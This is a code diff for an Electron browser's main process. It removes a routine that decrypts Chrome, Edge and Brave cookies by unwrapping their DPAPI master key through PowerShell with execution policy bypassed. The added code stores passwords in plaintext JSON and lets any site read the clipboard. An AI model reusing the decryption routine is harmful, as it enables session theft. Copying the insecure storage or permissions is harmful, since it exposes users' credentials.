@@ -1,14 +1,17 @@
-const { app, BrowserWindow, ipcMain, session, Menu } = require('electron');
+const { app, BrowserWindow, ipcMain, session, Menu, clipboard, nativeImage } = require('electron');
 const path = require('path');
 const fs = require('fs');
 
 let mainWindow;
 
 // Paths for persistent data
-const userDataPath = app.getPath('userData');
+const userDataPath = path.join(app.getPath('appData'), 'NebulaBrowserUserData_Clean');
+app.setPath('userData', userDataPath);
 const bookmarksPath = path.join(userDataPath, 'bookmarks.json');
 const historyPath = path.join(userDataPath, 'history.json');
 const configPath = path.join(userDataPath, 'config.json');
+const credentialsPath = path.join(userDataPath, 'credentials.json');
+const drivePath = path.join(userDataPath, 'drive.json');
 
 function readConfig() {
   return readJSON(configPath, { neonMode: false, agentMode: false, privacyMode: false });
@@ -67,7 +70,7 @@ function createWindow() {
     height: 800,
     minWidth: 800,
     minHeight: 600,
-    frame: true,
+    frame: false,
     title: 'Nebula Browser',
     icon: path.join(__dirname, 'icon.png'),
     autoHideMenuBar: true,
@@ -105,195 +108,51 @@ ipcMain.handle('save-history', async (event, history) => {
   return true;
 });
 
-// -------------------------------------------------------
-// Import Google cookies from Chrome so Gemini sign-in works
-// -------------------------------------------------------
-async function importAllBrowserCookies(targetSession) {
-  const { spawnSync } = require('child_process');
-  const os = require('os');
-  const crypto = require('crypto');
-  const Database = require('better-sqlite3');
-
-  const localAppData = process.env.LOCALAPPDATA;
-  const browsers = [
-    {
-      name: 'Chrome',
-      basePath: path.join(localAppData, 'Google', 'Chrome', 'User Data')
-    },
-    {
-      name: 'Edge',
-      basePath: path.join(localAppData, 'Microsoft', 'Edge', 'User Data')
-    },
-    {
-      name: 'Brave',
-      basePath: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data')
-    }
-  ];
-
-  let totalImported = 0;
-  let errors = [];
-
-  for (const browser of browsers) {
-    const localStatePath = path.join(browser.basePath, 'Local State');
-    if (!fs.existsSync(localStatePath)) continue;
-
-    try {
-      // Read encrypted master key
-      const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
-      const encryptedKeyB64 = localState.os_crypt.encrypted_key;
-      if (!encryptedKeyB64) continue;
-      const encryptedKeyWithPrefix = Buffer.from(encryptedKeyB64, 'base64');
-      const dpapiEncrypted = encryptedKeyWithPrefix.slice(5); // remove "DPAPI" prefix
-
-      // Decrypt master key
-      const dpapiB64 = dpapiEncrypted.toString('base64');
-      const psScriptPath = path.join(os.tmpdir(), 'nebula_dpapi.ps1');
-      fs.writeFileSync(psScriptPath, `
-param([string]$enc)
-Add-Type -AssemblyName System.Security
-$bytes = [Convert]::FromBase64String($enc)
-$dec = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-[Convert]::ToBase64String($dec)
-`);
-      const psResult = spawnSync('powershell', [
-        '-NonInteractive', '-ExecutionPolicy', 'Bypass',
-        '-File', psScriptPath,
-        '-enc', dpapiB64
-      ], { encoding: 'utf8' });
-      try { fs.unlinkSync(psScriptPath); } catch {}
-      if (psResult.status !== 0 || !psResult.stdout.trim()) {
-        continue;
-      }
-      const masterKey = Buffer.from(psResult.stdout.trim(), 'base64');
-
-      // Scan standard profiles
-      const profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'];
-      for (const profile of profiles) {
-        const cookiePaths = [
-          path.join(browser.basePath, profile, 'Network', 'Cookies'),
-          path.join(browser.basePath, profile, 'Cookies')
-        ];
-        
-        let cookiePath = null;
-        for (const p of cookiePaths) {
-          if (fs.existsSync(p)) {
-            cookiePath = p;
-            break;
-          }
-        }
-
-        if (!cookiePath) continue;
-
-        // Copy database file so it isn't locked by browser
-        const tempPath = path.join(os.tmpdir(), `nebula_${browser.name}_${profile}_cookies_${Date.now()}.db`);
-        try {
-          fs.copyFileSync(cookiePath, tempPath);
-        } catch (copyErr) {
-          // If fs.copyFileSync fails because the database is locked (EBUSY), use cmd's copy command which can read active locked files
-          const { execSync } = require('child_process');
-          try {
-            execSync(`cmd.exe /c copy /y "${cookiePath}" "${tempPath}"`, { stdio: 'ignore' });
-          } catch (cmdErr) {
-            errors.push(`${browser.name} (${profile}) file copy failed: ${cmdErr.message}`);
-            continue;
-          }
-        }
-
-        try {
-          const db = new Database(tempPath, { readonly: true });
-          const rows = db.prepare(`
-            SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, samesite
-            FROM cookies
-            WHERE host_key LIKE '%.google.com'
-          `).all();
-          db.close();
-
-          for (const row of rows) {
-            let cookieValue = row.value;
-
-            if (row.encrypted_value && row.encrypted_value.length > 3) {
-              const encBuf = Buffer.from(row.encrypted_value);
-              const prefix = encBuf.slice(0, 3).toString('ascii');
-              if (prefix === 'v10' || prefix === 'v11') {
-                try {
-                  const iv = encBuf.slice(3, 15);
-                  const tag = encBuf.slice(-16);
-                  const ciphertext = encBuf.slice(15, -16);
-                  const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
-                  decipher.setAuthTag(tag);
-                  cookieValue = decipher.update(ciphertext, null, 'utf8') + decipher.final('utf8');
-                } catch { continue; }
-              }
-            }
-
-            if (!cookieValue) continue;
-
-            const domain = row.host_key;
-            const urlHost = domain.startsWith('.') ? domain.slice(1) : domain;
-            const expirySeconds = row.expires_utc
-              ? Math.floor(row.expires_utc / 1000000 - 11644473600)
-              : undefined;
-
-            try {
-              // Inject into Gemini sidebar
-              await targetSession.cookies.set({
-                url: `https://${urlHost}`,
-                name: row.name,
-                value: cookieValue,
-                domain: domain,
-                path: row.path || '/',
-                secure: !!row.is_secure,
-                httpOnly: !!row.is_httponly,
-                sameSite: row.samesite === 2 ? 'strict' : row.samesite === 1 ? 'lax' : 'no_restriction',
-                ...(expirySeconds ? { expirationDate: expirySeconds } : {})
-              });
-
-              // Also inject cookies into Electron's default session (for normal browser tabs)
-              await session.defaultSession.cookies.set({
-                url: `https://${urlHost}`,
-                name: row.name,
-                value: cookieValue,
-                domain: domain,
-                path: row.path || '/',
-                secure: !!row.is_secure,
-                httpOnly: !!row.is_httponly,
-                sameSite: row.samesite === 2 ? 'strict' : row.samesite === 1 ? 'lax' : 'no_restriction',
-                ...(expirySeconds ? { expirationDate: expirySeconds } : {})
-              });
-
-              totalImported++;
-            } catch { /* skip invalid cookies */ }
-          }
-        } catch (dbErr) {
-          errors.push(`${browser.name} (${profile}): ${dbErr.message}`);
-        } finally {
-          try { fs.unlinkSync(tempPath); } catch {}
-        }
-      }
-    } catch (err) {
-      errors.push(`${browser.name}: ${err.message}`);
-    }
-  }
-
-  if (totalImported === 0 && errors.length > 0) {
-    throw new Error('Failed to decrypt cookies. Details: ' + errors.join('; '));
-  }
-  if (totalImported === 0) {
-    throw new Error('No Google accounts signed in (Chrome, Edge, or Brave). Please sign into Google first.');
-  }
-
-  return totalImported;
-}
-
-ipcMain.handle('import-chrome-cookies', async () => {
-  const geminiSession = session.fromPartition('persist:nebula-gemini');
-  try {
-    const count = await importAllBrowserCookies(geminiSession);
-    return { success: true, count };
-  } catch (err) {
-    return { success: false, error: err.message };
-  }
+ipcMain.handle('get-credentials', async () => {
+  return readJSON(credentialsPath, []);
 });
+
+ipcMain.handle('save-credential', async (event, cred) => {
+  const credentials = readJSON(credentialsPath, []);
+  // Avoid saving exact duplicates
+  const exists = credentials.some(c => c.url === cred.url && c.username === cred.username && c.password === cred.password);
+  if (!exists) {
+    credentials.push(cred);
+    writeJSON(credentialsPath, credentials);
+  }
+  return true;
+});
+
+ipcMain.handle('delete-credential', async (event, { url, username }) => {
+  const credentials = readJSON(credentialsPath, []);
+  const filtered = credentials.filter(c => !(c.url === url && c.username === username));
+  writeJSON(credentialsPath, filtered);
+  return true;
+});
+
+ipcMain.handle('get-drive-files', async () => {
+  return readJSON(drivePath, []);
+});
+
+ipcMain.handle('save-drive-file', async (event, fileObj) => {
+  const files = readJSON(drivePath, []);
+  const nextId = files.reduce((max, f) => f.id > max ? f.id : max, 0) + 1;
+  fileObj.id = nextId;
+  files.push(fileObj);
+  writeJSON(drivePath, files);
+  return nextId;
+});
+
+ipcMain.handle('delete-drive-file', async (event, id) => {
+  const files = readJSON(drivePath, []);
+  const filtered = files.filter(f => f.id !== id);
+  writeJSON(drivePath, filtered);
+  return true;
+});
+
+// -------------------------------------------------------
+// Logging Utilities
+// -------------------------------------------------------
 
 ipcMain.on('log-to-file', (event, msg) => {
   logMsg('RENDERER: ' + msg);
@@ -345,14 +204,98 @@ ipcMain.handle('restart-app', () => {
   app.exit(0);
 });
 
-let pendingPermissions = new Map();
-let permissionRequestId = 0;
+ipcMain.handle('window-minimize', () => {
+  if (mainWindow) mainWindow.minimize();
+  return true;
+});
 
-ipcMain.handle('respond-to-permission', async (event, { id, allowed }) => {
-  const callback = pendingPermissions.get(id);
-  if (callback) {
-    callback(allowed);
+ipcMain.handle('window-maximize', () => {
+  if (mainWindow) {
+    if (mainWindow.isMaximized()) {
+      mainWindow.unmaximize();
+    } else {
+      mainWindow.maximize();
+    }
+  }
+  return true;
+});
+
+ipcMain.handle('window-close', () => {
+  if (mainWindow) mainWindow.close();
+  return true;
+});
+
+ipcMain.handle('capture-page', async (event, rect) => {
+  try {
+    const img = await mainWindow.webContents.capturePage(rect);
+    return img.toDataURL();
+  } catch (err) {
+    logMsg('Error capturing page: ' + err.stack);
+    return null;
+  }
+});
+
+ipcMain.handle('copy-image-to-clipboard', async (event, dataUrl) => {
+  try {
+    const img = nativeImage.createFromDataURL(dataUrl);
+    clipboard.writeImage(img);
+    return true;
+  } catch (err) {
+    logMsg('Error copying to clipboard: ' + err.stack);
+    return false;
+  }
+});
+
+let pendingPermissions = new Map();
+let pendingKeys = new Map(); // "origin:permission" -> array of callbacks/ids
+let permissionRequestId = 0;
+let sessionPermissions = new Map(); // origin -> Set of permissions
+let timedPermissions = new Map(); // origin:permission -> expire timestamp
+
+function checkPermission(origin, permission) {
+  const config = readConfig();
+  if (config.foreverPermissions && config.foreverPermissions[`${origin}:${permission}`]) {
+    return true;
+  }
+  const sessionSet = sessionPermissions.get(origin);
+  if (sessionSet && sessionSet.has(permission)) {
+    return true;
+  }
+  const expireAt = timedPermissions.get(`${origin}:${permission}`);
+  if (expireAt && expireAt > Date.now()) {
+    return true;
+  }
+  return false;
+}
+
+function grantPermission(origin, permission, lifetime) {
+  if (lifetime === 'forever') {
+    const config = readConfig();
+    config.foreverPermissions = config.foreverPermissions || {};
+    config.foreverPermissions[`${origin}:${permission}`] = true;
+    writeConfig(config);
+  } else if (lifetime === 'session') {
+    if (!sessionPermissions.has(origin)) {
+      sessionPermissions.set(origin, new Set());
+    }
+    sessionPermissions.get(origin).add(permission);
+  } else if (lifetime === 'timed') {
+    timedPermissions.set(`${origin}:${permission}`, Date.now() + 5 * 60 * 1000);
+  }
+}
+
+ipcMain.handle('respond-to-permission', async (event, { id, allowed, lifetime }) => {
+  const req = pendingPermissions.get(id);
+  if (req) {
+    const { origin, permission, callbacks } = req;
+    if (allowed) {
+      grantPermission(origin, permission, lifetime);
+      callbacks.forEach(cb => cb(true));
+    } else {
+      callbacks.forEach(cb => cb(false));
+    }
     pendingPermissions.delete(id);
+    pendingKeys.delete(`${origin}:${permission}`);
   }
   return true;
 });
@@ -390,17 +333,40 @@ app.whenReady().then(() => {
 
   session.defaultSession.setPermissionRequestHandler((webContents, permission, callback, details) => {
     const config = readConfig();
-    if (!config.privacyMode) {
+    const requestingUrl = webContents.getURL();
+    
+    // Auto-allow clipboard access or any request from the trusted main app window (file://)
+    if (requestingUrl.startsWith('file://') || permission === 'clipboard-sanitized-write' || permission === 'clipboard-read') {
       return callback(true);
     }
+
+    let origin;
+    try {
+      origin = new URL(requestingUrl).origin;
+    } catch (err) {
+      origin = requestingUrl;
+    }
+
+    if (checkPermission(origin, permission)) {
+      return callback(true);
+    }
+
+    const key = `${origin}:${permission}`;
+    if (pendingKeys.has(key)) {
+      pendingKeys.get(key).push(callback);
+      return;
+    }
+
     const id = ++permissionRequestId;
-    pendingPermissions.set(id, callback);
-    const requestingUrl = webContents.getURL();
+    pendingPermissions.set(id, { callback, origin, permission, callbacks: [callback] });
+    pendingKeys.set(key, pendingPermissions.get(id).callbacks);
+
     if (mainWindow && !mainWindow.isDestroyed()) {
       mainWindow.webContents.send('request-permission', {
         id,
         url: requestingUrl,
-        permission: permission
+        permission: permission,
+        privacyMode: !!config.privacyMode
       });
     } else {
       callback(false);
